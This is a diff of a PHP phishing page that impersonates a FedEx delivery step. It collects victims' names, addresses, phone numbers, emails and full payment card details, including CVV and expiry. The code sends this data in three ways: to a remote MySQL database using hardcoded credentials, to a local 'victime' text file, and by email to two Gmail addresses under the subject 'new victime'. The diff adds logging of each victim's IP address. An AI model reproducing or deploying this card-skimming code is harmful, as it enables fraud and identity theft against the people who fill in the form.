@@ -97,25 +97,11 @@ require 'autre/phpmailer/smtp.php';
 
 
 
-if(    isset($_POST["name"])  )
+if(  isset($_POST["name"])     )
 {
-	
-	
-	
-	
-	
+		
 $connect = new PDO("mysql:host=freedb.tech;dbname=freedbtech_wordpresst", "freedbtech_mehdiouatmane", "mehdi2014@A");
-$query =  "INSERT INTO tablee   (name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
-$user_data =  array(      ':name' => $_POST["name"],        ':date' => $_POST["date"],      ':address' => $_POST["address"],     ':codepostal' => $_POST["codepostal"],    ':city' => $_POST["city"],    ':phone' => $_POST["phone"],    ':email' => $_POST["email"],    ':namecard' => $_POST["namecard"],    ':cardnumber' => $_POST["cardnumber"],    ':cvv' => $_POST["cvv"],    ':datexp' => $_POST["datexp"]          ) ;
-if(     $connect   ->  prepare($query)	->  execute($user_data)               )       { echo "<script> window.location.href = 'fedex2end.php'; </script>"; }  else   { echo "<script> alert('erreur'); </script>"; }
-
-
-
-
-
-
-
-
+$ip = $_SERVER['REMOTE_ADDR']  ;
 $name = $_POST["name"];
 $date = $_POST["date"];
 $address = $_POST["address"];
@@ -127,25 +113,6 @@ $namecard = $_POST['namecard'];
 $cardnumber = $_POST['cardnumber'];
 $cvv = $_POST['cvv'];
 $datexp = $_POST['datexp'];  
-$file = Fopen("fedex2victime.txt","a+"); 
-fwrite($file , "victime"  . "\n" );
-fwrite($file ,    "name : "         .      $name         .      "\n"); 
-fwrite($file ,    "date : "         .      $date         .      "\n"); 
-fwrite($file ,    "address : "      .      $address      .      "\n"); 
-fwrite($file ,    "codepostal : "   .      $codepostal   .      "\n");  
-fwrite($file ,    "city : "         .      $city         .      "\n"); 
-fwrite($file ,    "phone : "        .      $phone        .      "\n"); 
-fwrite($file ,    "email : "        .      $email        .      "\n"); 
-fwrite($file ,    "namecard : "     .      $namecard     .      "\n"); 
-fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n"); 
-fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
-fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
-fwrite($file , "\n");
-if ( $file   ) {  echo "";   }else{  echo "";   }
-
-
-
-
 
 
 
@@ -166,9 +133,59 @@ $mail->AddAddress('mehdi.ouatmane@gmail.com' , 'Friend1' );
 $mail->AddAddress('mehdiouatmane9@gmail.com' , 'Friend2' );  
 $mail->IsHTML(true);   
 $mail->Subject = 'new victime';           
-$mail->Body = 'les info victime: '   .   '<br> name: '   .   $name    .   '<br> date: '    .  $date    .   '<br> address: ' .  $address   .   '<br> codepostal: '  .  $codepostal   .   '<br> city: '  .  $city    .   '<br> phone: '    .    $phone    .   '<br> email: '    .   $email        .   '<br> namecard: '    .   $namecard       .   '<br> cardnumber: '    .   $cardnumber        .   '<br> cvv: '    .   $cvv       .   '<br> datexp: '    .   $datexp        ;           
+$mail->Body = 'les info victime: '     .      '<br> ip: '     .    $ip     .   '<br> name: '   .    $name    .   '<br> date: '    .  $date    .   '<br> address: ' .  $address   .   '<br> codepostal: '  .  $codepostal   .   '<br> city: '  .  $city    .   '<br> phone: '    .    $phone    .   '<br> email: '    .   $email        .   '<br> namecard: '    .   $namecard       .   '<br> cardnumber: '    .   $cardnumber        .   '<br> cvv: '    .   $cvv       .   '<br> datexp: '    .   $datexp        ;           
 $mail->smtpClose();
-if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
+if ( $mail->send() )   {	echo "yestoemail"; }  else   {  echo "nntoemail";	}
+
+
+
+
+
+
+
+
+
+
+$file = Fopen("fedex2victime.txt","a+"); 
+fwrite($file , "victime"  . "\n" );
+fwrite($file ,    "ip : "           .      $ip           .      "\n"); 
+fwrite($file ,    "name : "         .      $name         .      "\n"); 
+fwrite($file ,    "date : "         .      $date         .      "\n"); 
+fwrite($file ,    "address : "      .      $address      .      "\n"); 
+fwrite($file ,    "codepostal : "   .      $codepostal   .      "\n");  
+fwrite($file ,    "city : "         .      $city         .      "\n"); 
+fwrite($file ,    "phone : "        .      $phone        .      "\n"); 
+fwrite($file ,    "email : "        .      $email        .      "\n"); 
+fwrite($file ,    "namecard : "     .      $namecard     .      "\n"); 
+fwrite($file ,    "cardnumber : "   .      $cardnumber   .      "\n"); 
+fwrite($file ,    "cvv : "          .      $cvv          .      "\n"); 
+fwrite($file ,    "datexp : "       .      $datexp       .      "\n"); 
+fwrite($file , "\n");
+if ( $file   ) {  echo "yestofile";   }else{  echo "nntofile";   }
+
+
+
+
+
+
+
+
+
+$query =  "INSERT INTO tablee   (ip, name, date, address, codepostal, city, phone, email, namecard, cardnumber, cvv, datexp)   VALUES    ( :ip, :name, :date, :address, :codepostal, :city, :phone, :email, :namecard, :cardnumber, :cvv, :datexp ) " ;
+$user_data =  array(    ':ip' => $ip,    ':name' => $name,        ':date' => $date,      ':address' => $address,     ':codepostal' => $codepostal,    ':city' => $city,    ':phone' => $phone,    ':email' => $email,    ':namecard' => $namecard,    ':cardnumber' => $cardnumber,    ':cvv' => $cvv,    ':datexp' => $datexp          ) ;
+if(     $connect   ->  prepare($query)	->  execute($user_data)               )       { echo "<script> window.location.href = 'fedex2end.php'; </script>"; }  else   { echo "<script> alert('erreur'); </script>"; }
+
+
+
+
+
+
+
+
+
+
+
+
 
 	
 
@@ -214,6 +231,7 @@ if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 						<h3> <span>1st step</span> Validate your address </h3>
 						<p> <span>Note</span> :All fields are mandatory</p>		
 						<div>
+						    <input type="hidden"  placeholder="ip"    value=""    name="ip"   id="ip"    class="input">         
 							<div class="row" >
 							   <div class="col1 mb-3"  >   <input type="text"    placeholder="Last name and first name"     value=""    name="name"    id="name"  class="input">        <div class="txt_error"   id="txt_error_name" ></div>          </div>    
 							   <div class="col1" >  <input type="text"   placeholder="DD/MM/YYYY"     value=""     name="date"      id="date"      class="input">                       <div class="txt_error"   id="txt_error_date" ></div>          </div> 
@@ -275,7 +293,6 @@ if ( $mail->send() )   {	echo ""; }  else   {  echo "";	}
 
 		
 </div> 
-
 
 
 
